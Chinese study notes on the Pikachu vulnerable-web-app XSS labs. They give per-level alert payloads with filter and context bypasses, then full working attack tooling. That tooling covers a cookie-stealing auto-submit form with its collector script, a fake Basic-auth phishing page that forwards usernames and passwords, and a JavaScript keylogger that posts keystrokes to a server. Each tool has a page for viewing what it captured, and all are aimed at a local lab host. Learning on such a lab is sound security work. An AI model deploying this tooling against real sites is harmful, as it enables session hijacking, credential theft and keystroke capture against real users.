# pikachu-labs-XSS 学习笔记

## 一. 知识预习

###  JavaScript 伪协议

JavaScript伪协议，通常指的是那些在 URL 中可以被 JavaScript 引擎解析和执行的**特殊协议前缀**。这些伪协议允许浏览器在 URL 的上下文中执行 JavaScript 代码，以下是几种常见的 JavaScript 伪协议：

1. `javascript:` 这是最常见的JavaScript伪协议，可以直接在URL中插入JavaScript代码。例如：`javascript:alert('Hello, World!')`，当这个URL在浏览器中输入时，会弹出一个包含“Hello, World!”的警告框。
2. `data:` 虽然`data:`协议不是专为JavaScript设计的，但它可以用来嵌入文本、图片等数据到URL中。当与JavaScript结合时，可以用来嵌入内联的HTML和脚本，例如：`data:text/html,<script>alert('Hello, World!')</script>`。
3. `vbs:` 类似于`javascript:`，但用于执行VBScript代码。尽管在一些浏览器中可能不起作用，但在Internet Explorer中可以使用。

使用JavaScript伪协议时需要注意安全问题，因为它们可以使恶意代码直接在用户的浏览器中运行。例如，**跨站脚本（XSS）攻击**就是通过在页面中注入恶意JavaScript代码来实现的。

在现代Web开发中，直接在URL中使用`javascript:`伪协议来执行代码的做法已经被废弃，因为这可能导致安全漏洞。更推荐的实践是在网页的脚本标签中使用JavaScript，或者通过API调用执行JavaScript函数（更常见）。

### 常见的事件属性

在HTML中，`onmouseover`是一个事件属性，用于当鼠标指针移动到一个元素上时触发的JavaScript代码。这是一个典型的事件处理属性，可以用来执行任何JavaScript函数，或者直接执行一些代码。

```html
<!-- 当鼠标移到这个<div>元素上时，它的背景颜色会变成黄色 -->
<div onmouseover="this.style.backgroundColor='yellow'">
    将鼠标放在此区域上
</div>
```

其他相似的事件处理属性：

**`onmouseout`**：当鼠标离开元素时触发。

```html
<div onmouseout="this.style.backgroundColor='white'">
    将鼠标从这个区域移开
</div>
```

**`onclick`**：当用户点击元素时触发。

```html
<button onclick="alert('你点击了按钮')">
    点我
</button>
```

**`onmousedown`** 和 **`onmouseup`**：分别在鼠标键被按下和释放时触发。

```html
<div onmousedown="console.log('按下')" onmouseup="console.log('释放')">
    按下并释放鼠标键
</div>
```

**`onmousemove`**：当鼠标在元素上移动时连续触发。

```html
<div onmousemove="console.log('移动')">
    将鼠标在该区域上移动
</div>
```

**`onfocus`** 和 **`onblur`**：分别在元素获得和失去焦点时触发。

```html
<input type="text" onfocus="this.style.border='2px solid blue'" onblur="this.style.border='1px solid gray'">
    输入框
</input>
```

这些事件处理属性可以让你的网页更加交互和动态。不过，在使用时，应该注意不要过度使用内联事件处理，因为这可能导致代码难以维护和阅读。通常，使用事件监听器（如JavaScript的`addEventListener`）是更佳的实践，可以将事件处理逻辑与HTML结构分离，使代码更加清晰。



### htmlspecialchars() 函数

在PHP中，`htmlspecialchars()`函数用于将HTML特殊字符转换为HTML实体，以防止用户输入被浏览器错误地解析为HTML或JavaScript代码。这有助于防止跨站脚本（XSS）攻击。

`htmlspecialchars()`函数默认情况下会转换以下四个字符：

- `<` 转换为 `<`
- `>` 转换为 `>`
- `"` 转换为 `"`
- `'`（单引号）不会被转换，除非在函数调用中设置了ENT_QUOTES或ENT_HTML5标志
- `&` 转换为 `&`，这是为了防止实体解析，但如果输入本身是实体，如`©`，则应避免转换`&`，否则会破坏实体

如果你希望`htmlspecialchars()`也转换单引号（'），你需要在调用函数时明确指定`ENT_QUOTES`标志，如下所示：

```php
echo htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
```

或者在PHP 5.4及以上版本中，你可以使用`ENT_HTML5`标志来转换所有字符，包括单引号：

```php
echo htmlspecialchars($string, ENT_HTML5, 'UTF-8');
```

需要注意的是，`ENT_QUOTES`会转换所有的引号，包括双引号和单引号，而`ENT_HTML5`则会根据HTML5规范来转换字符。

简而言之：在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 `<`、`>`、`&`、`'`、`"` 这五个字符，基本可以防范这里的 XSS 攻击。
但是，8.1.0 以下版本的 PHP 默认只会转义 `<`、`>`、`&`、`"` 这四个字符，不会转义单引号 `'`。这就给这个函数带来了巨大的安全隐患。



### href 属性可以指向那些内容

HTML中的`href`属性主要用于`<a>`标签中，表示超链接的引用，它可以指向各种类型的内容，包括但不限于：

1. **网页**：最常见的用法是链接到另一个网页，例如：

   ```html
   <a href="https://www.example.com">Example Website</a>
   ```

2. **页面内的位置**：使用锚点链接到当前页面或另一页面内的特定位置，例如：

   ```html
   <a href="#section1">跳至Section1</a>
   ```

3. **文件**：链接到任何类型的文件，如PDF、Word文档、图片等，例如：

   ```html
   <a href="report.pdf">Download Report</a>
   ```

4. **电子邮件**：可以通过`mailto:`协议发送电子邮件，例如：

   ```html
   <a href="mailto:support@example.com">Contact Support</a>
   ```

5. **JavaScript代码**：使用`javascript:`协议可以执行JavaScript代码，虽然不推荐，但在某些情况下用于弹出窗口或触发某些事件，例如：

   ```html
   <a href="javascript:alert('Hello');">Click me!</a>
   ```

6. **电话号码**：使用`tel:`协议可以拨打电话，例如：

   ```html
   <a href="tel:+1234567890">Call Now</a>
   ```

7. **相对路径**：链接到同一站点内的其他页面，可以使用相对路径，例如：

   ```html
   <a href="subfolder/page.html">Subfolder Page</a>
   ```

8. **绝对路径**：链接到同一服务器上的其他页面，可以使用绝对路径，例如：

   ```html
   <a href="/root/folder/page.html">Folder Page</a>
   ```

9. **空链接**：在某些情况下，可能需要一个链接看起来像链接，但不执行任何操作，可以使用`#`或`javascript:;`，例如：

   ```html
   <a href="#">Read more</a>
   ```



## 二. 反射型XSS

### 反射型XSS-Get

解题思路：修改前端页面中用于限制输入字符的长度，防止字符串被截断

```js
<script>alert('hack')</script>
```

### 反射型XSS-Post

解题思路：同上

```js
<script>alert('hack')</script>
```



## 三. 存储型XSS

留言板会将我们输入的数据**存储到数据库中**，所以说存储型XSS攻击是持久性的！即当我们再次访问网页时，就可以重现该漏洞：

```js
<script>alert('hack')</script>
```



## 四. DOM型XSS

DOM 可以理解为访问 HTML 的标准接口，DOM会 HTML 分成一个 DOM 树

DOM型XSS的 XSS 代码不需要服务器解析，触发 XSS 靠的就是前端的 DOM 解析！

前端 js 代码分析：

```html
<div id="dom"><a href="">what do you see?</a></div>
```

```js
<script>
    function domxss(){
        var str = document.getElementById("text").value;
        document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
    }
    //试试：'><img src="#" onmouseover="alert('xss')">
    //试试：' onclick="alert('xss')">,闭合掉就行
</script>
```

解题思路 1：利用 javascript 伪协议：

```js
javascript:alert("hack")
```

解题思路 2：利用绕过、闭合操作：

```js
'><img src="#" onmouseover="alert('hack')">
```

```js
' onclick="alert('hack')">
```



## 五. Dom型XSS-X

前端页面 js 代码分析：

```js 
<script>
    function domxss(){
        var str = window.location.search;
        var txss = decodeURIComponent(str.split("text=")[1]);
        var xss = txss.replace(/\+/g,' ');
    	// alert(xss);
        document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
    }
    //试试：'><img src="#" onmouseover="alert('xss')">
    //试试：' onclick="alert('xss')">,闭合掉就行
</script>
```

解题思路1：利用绕过、闭合操作：

```js
'><img src="#" onmouseover="alert('hack')">
```

```js
' onclick="alert('hack')"
```



## 六. XSS之盲打

之所以称为XSS盲打，是因为在提交数据后，前端是看不到输入的内容及效果的，只有后端管理员可以看见，当管理员触发盲打被 X 到的话，危害是非常大的，很可能造成管理员的 cookie 泄露，进而使攻击者可以通过管理员权限登录网站后台。

```js
<script>alert('hack')</script>
```



## 七. XSS之过滤

通过输入 `<script>alert('hack')</script>` 后，发现网页仅显示 `'>>'`，即后端过滤掉了 js 关键字 `script`

解题思路 1：注入带有事件属性的 img 标签

```html
<img src="#" onmouseover="alert('hack')">
```

解题思路 2：关键字大小写混合绕过（赌写后端代码的程序员非常...好吧实际上的确是...）

```html
<SCriPt>alert('hack')</SCriPt>
```

顺手展示下后端用于过滤 js 关键字的代码吧：

```php
if(isset($_GET['submit']) && $_GET['message'] != null){
    //这里会使用正则对<script进行替换为空,也就是过滤掉
    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
	//$message=str_ireplace('<script>',$_GET['message']);
    if($message == 'yes'){
        $html.="<p>那就去人民广场一个人坐一会儿吧!</p>";
    }else{
        $html.="<p>别说这些'{$message}'的话,不要怕,就是干!</p>";
    }
}
```



## 八. ❌ XSS之`htmlspecialchars`

后端源码分析：

```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入点啥吧！</p>";
    }else {
        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理
        $message=htmlspecialchars($_GET['message']);
        $html1.="<p class='notice'>你的输入已经被记录:</p>";
        //输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
        //$html2.="<input class='input' type='text' name='inputvalue' readonly='readonly' value='{$message}' style='margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;'/>";
        $html2.="<a href='{$message}'>{$message}</a>";
    }
}
```

因为 php 中的 `htmlspecialchars()` 函数默认不会对`'`（单引号）进行转换，除非在函数调用中设置了`ENT_QUOTES`或`ENT_HTML5`标志，所以说....好吧依旧搞不懂......

解题思路 1：利用 JavaScript 伪协议：

```js
javascript:alert("hack")
```

but，如果将双引号改成单引号就不行！如下：

```js
javascript:alert('hack')
```

**通过查看前端网页代码并点击双引号符号`"`，你会发现 `"` 其实是 `&quot;`**，也就是说：用户输入的双引号 `"` 被转换成了 `&quot;`，其是一种HTML实体符号，故盲猜后端将输入的数据转换成了HTML实体，并返回！

......头晕......为什么?.......



## 九. XSS之`href`输出

后端源码分析：

```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>叫你输入个url,你咋不听?</p>";
    }
    if($_GET['message'] == 'www.baidu.com'){
        $html.="<p class='notice'>我靠,我真想不到你是这样的一个人</p>";
    }else {
        //输出在a标签的href属性里面,可以使用javascript协议来执行js
        //防御:只允许http,https,其次在进行htmlspecialchars处理
        $message=htmlspecialchars($_GET['message'],ENT_QUOTES);
        $html.="<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>";
    }
}
```

可得，源码中不但使用了函数 `htmlspecialchars()`，并传入了参数`ENT_QUOTES`，即导致符号 `<`、`>`、`"`、`'`、`&`均会被转义为 HTML 实体，所以这里无法使用**闭合标签**、**闭合属性**或**注入新标签**等 XSS 攻击方法，**But 要知道 href 属性支持使用 JavaScript 伪协议！！！**

解题思路：使用 JavaScript 伪协议

```js
javascript:alert('hack')
```



## 十. XSS之`js`输出

输入数据并回车后，分析前端页面中，由后端服务器返回的 JS 代码：

```js
<script>
    $ms='demo';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
			// alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }
    }
</script>
```

顺手粘下上述代码所对应的后端代码：

```php
<script>
    $ms='<?php echo $jsvar;?>';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
		   // alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }
    }
</script>
```

可以发现输入的数据赋值给了变量 `$ms`，并以单引号闭合，故解题思路很明了了：

* 首先使用 </script> 闭合源码中的 <script>
* 其次注入 JS 代码 <script>alert('hack')</script>

```js
</script><script>alert('hack')</script>
```



## 十一. 总结

来总结下上述所使用的 XSS 攻击代码吧：

1. 常规 JS 直接注入：

   ```js
   <script>alert('hack')</script>
   ```

2. JavaScript 伪协议注入：

   ```js
   javascript:alert("hack")
   ```

3. 直接注入带事件属性的 html 标签：

   ```js
   <img src="#" onmouseover="alert('hack')">
   ```

3. 闭合 + 注入带有事件属性的 html 标签：

   ```js
   '><img src="#" onmouseover="alert('hack')">
   ```

4. 闭合 + 注入事件属性：

   ```js
   ' onclick="alert('hack')">
   ```

5. JS 关键字大小写混合注入：

   ```js
   <SCriPt>alert('hack')</SCriPt>
   ```

6. 闭合 + 注入 JS：

   ```js
   </script><script>alert('hack')</script>
   ```

# Pikachu XSS 攻击演练

## 一. Cookie 收集

### 攻击原理

[受害者端]访问黑客拟造的包含 XSS Payload 的链接，进而触发 XSS Payload ———> XSS Payload 获取受害者端浏览器中的Cookie，然后将其发给[黑客端] ———> 黑客可结合 CSRF 攻击，进行伪造用户登录等恶意操作

### POST 类型

1. `post.html`：拟造包含 XSS Payload 页面，将其链接发给受害者（前提是受害者端的网站存在 XSS 漏洞），当受害者访问该链接后，XSS Payload 将会在受害者的浏览器中执行，然后将窃取到的数据 Cookie 发给黑客：

   ```js
   // 值得注意的是：攻击成功的前提是受害者已经登录（http://127.0.0.1/pikachu/vul/xss/xsspost/post_login.php）成功
   // 因为访问 http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php 的前提是用户已登录
   http://127.0.0.1/pikachu/pkxss/xcookie/post.html
   ```

   ```html
   <html>
   <head>
   <!-- 在网页加载完成后，自动触发 ID 为"postsubmit"的 HTML 元素的点击事件 -->
   <script>
   window.onload = function() {
     document.getElementById("postsubmit").click();
   }
   </script>
   </head>
   <body>
   <!-- 存在反射型 XSS 漏洞的页面地址：http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php -->
   <form method="post" action="http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php">
       <!-- 拟造 XSS Payload，将其作为待提交的表单 Payload  -->
       <!-- 值得注意的是：这个表单的 HTML 代码是根据漏洞页面表单代码而设计的哟 -->
       <input id="xssr_in" type="text" name="message" value=
       "<script>
   document.location = 'http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
    </script>"
     />
       <input id="postsubmit" type="submit" name="submit" value="submit" />
   </form>
   </body>
   </html>
   ```

2. `cookie.php`：黑客用于接收数据 Cookie 的代码，并将数据写入数据库：

   ```js
   <?php
   include_once '../inc/config.inc.php';
   include_once '../inc/mysql.inc.php';
   $link=connect();
   
   //这个是获取cookie的api页面
   if(isset($_GET['cookie'])){
       $time=date('Y-m-d g:i:s');
       $ipaddress=getenv ('REMOTE_ADDR');
       $cookie=$_GET['cookie'];
       $referer=$_SERVER['HTTP_REFERER'];
       $useragent=$_SERVER['HTTP_USER_AGENT'];
       $query="insert cookies(time,ipaddress,cookie,referer,useragent) 
       values('$time','$ipaddress','$cookie','$referer','$useragent')";
       $result=mysqli_query($link, $query);
   }
   header("Location:http://127.0.0.1/pikachu/index.php");//重定向到一个可信的网站
   ?>
   ```

3. `pkxss_cookie_result.php`：黑客用于管理接收到的数据：

   ```php
   <?php
   // error_reporting(0);
   include_once '../inc/config.inc.php';
   include_once '../inc/mysql.inc.php';
   $link=connect();
   
   // 判断是否登录，没有登录不能访问
   if(!check_login($link)){
       header("location:../pkxss_login.php");
   }
   
   if(isset($_GET['id']) && is_numeric($_GET['id'])){
       $id=escape($link, $_GET['id']);
       $query="delete from cookies where id=$id";
       execute($link, $query);
   }
   ?>
   
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <title>cookie搜集结果</title>
   <link rel="stylesheet" type="text/css" href="../antxss.css" />
   </head>
   <body>
   <div id="title">
   <h1>pikachu Xss 获取cookies结果</h1>
   <a href="../xssmanager.php">返回首页</a>
   </div>
   <div id="xss_main">
   <table border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
       <tr>
           <td>id</td>
           <td>time</td>
           <td>ipaddress</td>
           <td>cookie</td>
           <td>referer</td>
           <td>useragent</td>
           <td>删除</td>
       </tr>
       <?php 
       $query="select * from cookies";
       $result=mysqli_query($link, $query);
       while($data=mysqli_fetch_assoc($result)){
   $html=<<<A
       <tr>
           <td>{$data['id']}</td>
           <td>{$data['time']}</td>
           <td>{$data['ipaddress']}</td>
           <td>{$data['cookie']}</td>
           <td>{$data['referer']}</td>
           <td>{$data['useragent']}</td>
           <td><a href="pkxss_cookie_result.php?id={$data['id']}">删除</a></td>
       </tr>
   A;
           echo $html;
       }
       ?>
   </table>
   </div>
   </body>
   </html>
   ```
   
3. 结合 CSRF 攻击，伪造用户登录，进而对数据进行破坏......

### GET 类型

1. `get.html`：拟造包含 XSS Payload 页面，将其链接发给受害者（前提是受害者端的网站存在 XSS 漏洞），当受害者访问该链接后，XSS Payload 将会在受害者的浏览器中执行，然后将窃取到的数据 Cookie 发给黑客：

   ```js
   http://127.0.0.1/pikachu/pkxss/xcookie/get.html
   ```

   ```html
   <html>
   <head>
   <script>
   window.onload = function() {
     document.getElementById("postsubmit").click();
   }
   </script>
   </head>
   <body>
   <form method="get" action="http://127.0.0.1/pikachu/vul/xss/xss_reflected_get.php">
       <input id="xssr_in" type="text" name="message" value=
       "<script>
   document.location = 'http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
    </script>"
     />
       <input id="postsubmit" type="submit" name="submit" value="submit" />
   </form>
   </body>
   </html>
   ```

2. 其余同上述 POST 类型的 XSS 哟~



## 二. 钓鱼攻击

### 攻击原理

[黑客]向受害者发送一个链接 ——> [受害者]点击链接后会给[黑客]发送一个请求 ——> 该请求会返回一个用于身份信息验证的 Basic 头部给受害者，若[受害者]安全意识不足，则可能会导致引诱受害者输入敏感的账户等信息！ ——> [受害者]输入的信息将会发送给[黑客]

### Let's hack it！

1. `fish.php`：构造 XSS Payload

   ```js
   // XSS Payload 1: 这种链接如果让[受害者]直接访问，会很容易被发觉异常，建议使用相关工具将其装换为不易识别的短链接
   http://127.0.0.1/pikachu/pkxss/xfish/fish.php
   
   // XSS Payload 2: 利用的 XSS 漏洞最好是存储型，例如 XSS 关卡 http://localhost/pikachu/vul/xss/xss_stored.php
   <script src="http://127.0.0.1/pikachu/pkxss/xfish/fish.php"></script>
   ```

   ```php
   <?php
   error_reporting(0);
   // var_dump($_SERVER);
   if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
    //发送认证框，并给出迷惑性的info
       header('Content-type:text/html;charset=utf-8');
       header("WWW-Authenticate: Basic realm='认证'");
       header('HTTP/1.0 401 Unauthorized');
       echo 'Authorization Required.';
       exit;
   } else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
    // 将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP
       // 无法正常获取用户名及密码？答：删除下述这行代码的多余空格，使其占一行就好啦！
       // 参考文章：https://wiki.bafangwy.com/doc/370/
       header("Location: http://127.0.0.1/pikachu/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}");
   }
   
   ?>
   ```

2. `xfish.php`：获取用户输入的账号数据，并将其写入到数据库中

   ```php
   <?php
   error_reporting(0);
   include_once '../inc/config.inc.php';
   include_once '../inc/mysql.inc.php';
   $link=connect();
   
   if(!empty($_GET['username']) && !empty($_GET['password'])){
       $username=$_GET['username'];
       $password=$_GET['password'];
       $referer="";
       $referer.=$_SERVER['HTTP_REFERER'];
       $time=date('Y-m-d g:i:s');
       $query="insert fish(time,username,password,referer) 
       values('$time','$username','$password','$referer')";
       $result=mysqli_query($link, $query);
   }
   ?>
   ```

3. `pkxss_fish_result.php`：用于管理获取的数据

   ```php
   <?php
   error_reporting(0);
   include_once '../inc/config.inc.php';
   include_once '../inc/mysql.inc.php';
   $link=connect();
   
   // 判断是否登录，没有登录不能访问
   if(!check_login($link)){
       header("location:../pkxss_login.php");
   }
   
   if(isset($_GET['id']) && is_numeric($_GET['id'])){
       $id=escape($link, $_GET['id']);
       $query="delete from fish where id=$id";
       execute($link, $query);
   }
   ?>
   
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <title>钓鱼结果</title>
   <link rel="stylesheet" type="text/css" href="../antxss.css" />
   </head>
   <body>
   <div id="title">
   <h1>pikachu Xss 钓鱼结果</h1>
   <a href="../xssmanager.php">返回首页</a>
   </div>
   <div id="result">
       <table class="tb" border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
           <tr>
               <td class="1">id</td>
               <td class="1">time</td>
               <td class="1">username</td>
               <td class="1">password</td>
               <td class="2">referer</td>
               <td class="2">操作</td>
           </tr>
       <?php 
       $query="select * from fish";
       $result=mysqli_query($link, $query);
       while($data=mysqli_fetch_assoc($result)){
   $html=<<<A
       <tr>
           <td class="1">{$data['id']}</td>
           <td class="1">{$data['time']}</td>
           <td class="1">{$data['username']}</td>
           <td class="1">{$data['password']}</td>
           <td class="2">{$data['referer']}</td>
            <td><a href="pkxss_fish_result.php?id={$data['id']}">删除</a></td>
       </tr>
   A;
           echo $html; 
       }
       ?>
       </table>
   </div>
   </body>
   </html>
   ```



## 三. 键盘记录

### 攻击原理

[黑客]直接将 XSS Payload 注入到含有 XSS 漏洞的网页 ——> 当[受害者]访问该页面后，其在该页面的任何操作将被记录 ——> 与此同时，XSS Payload 攻击代码会将记录同步发送给[黑客]

### Let's hack it！

1. `rk.js`：构造 XSS Payload

   ```js
   <script src="http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js"></script>
   ```

   ```js
   function createAjax(){
       var request=false;
       if(window.XMLHttpRequest){
           request=new XMLHttpRequest();
           if(request.overrideMimeType){
               request.overrideMimeType("text/xml");
           }
   
       }else if(window.ActiveXObject){
   
           var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
           for(var i=0; i<versions.length; i++){
               try{
                   request=new ActiveXObject(versions[i]);
                   if(request){
                       return request;
                   }
               }catch(e){
                   request=false;
               }
           }
       }
       return request;
   }
   
   var ajax=null;
   var xl="datax=";
   
   function onkeypress() {
       var realkey = String.fromCharCode(event.keyCode);
       xl+=realkey;
       show();
   }
   
   document.onkeypress = onkeypress;
   
   function show() {
       ajax = createAjax();
       ajax.onreadystatechange = function () {
           if (ajax.readyState == 4) {
               if (ajax.status == 200) {
                   var data = ajax.responseText;
               } else {
                   alert("页面请求失败");
               }
           }
       }
   
       var postdate = xl;
       ajax.open("POST", "http://127.0.0.1/pikachu/pkxss/rkeypress/rkserver.php",true);
       ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
       ajax.setRequestHeader("Content-length", postdate.length);
       ajax.setRequestHeader("Connection", "close");
       ajax.send(postdate);
   }
   ```

2. `rkserver.php`：接收[受害者]在页面上输入的所有数据

   ```php
   <?php
   include_once '../inc/config.inc.php';
   include_once '../inc/mysql.inc.php';
   $link=connect();
   
   //设置允许被跨域访问
   header("Access-Control-Allow-Origin:*");
   
   $data = $_POST['datax'];
   $query = "insert keypress(data) values('$data')";
   $result=mysqli_query($link,$query);
   ?>
   ```

3. `pkxss_keypress_result.php`：管理获取的数据

   ```php
   <?php
   // error_reporting(0);
   include_once '../inc/config.inc.php';
   include_once '../inc/mysql.inc.php';
   $link=connect();
   
   // 判断是否登录，没有登录不能访问
   if(!check_login($link)){
       header("location:../pkxss_login.php");
   }
   
   if(isset($_GET['id']) && is_numeric($_GET['id'])){
       $id=escape($link, $_GET['id']);
       $query="delete from keypress where id=$id";
       execute($link, $query);
   }
   ?>
   
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <title>键盘记录结果</title>
   <link rel="stylesheet" type="text/css" href="../antxss.css" />
   </head>
   <body>
   <div id="title">
   <h1>pikachu Xss 获取键盘记录结果</h1>
   <a href="../xssmanager.php">返回首页</a>
   </div>
   <div id="xss_main">
   <table border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
       <tr>
           <td>id</td>
           <td>记录</td>
           <td>操作</td>
       </tr>
       <?php 
       $query="select * from keypress";
       $result=mysqli_query($link, $query);
       while($data=mysqli_fetch_assoc($result)){
   $html=<<<A
       <tr>
           <td>{$data['id']}</td>
           <td>{$data['data']}</td>
           <td><a href="pkxss_keypress_result.php?id={$data['id']}">删除</a></td>
       </tr>
   A;
           echo $html;   
       }
       ?>
       
   </table>
   </div>
   </body>
   </html>
   ```
